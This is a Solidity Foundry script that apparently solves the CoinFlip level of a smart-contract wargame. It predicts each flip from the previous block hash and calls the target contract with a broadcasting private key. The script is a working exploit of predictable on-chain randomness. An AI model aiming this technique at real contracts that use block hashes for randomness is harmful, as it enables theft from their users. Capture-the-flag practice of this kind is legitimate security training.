pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;
import "../instances/Ilevel03.sol";
import "forge-std/Test.sol";

contract Level03 is Test {
    CoinFlip level03 =
        CoinFlip(payable(0xe2D06a92A81a68A184380613Dd72b0725A2bAc25));

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = level03.flip(side);
        require(success, "flip failed");
        vm.stopBroadcast();
    }
}
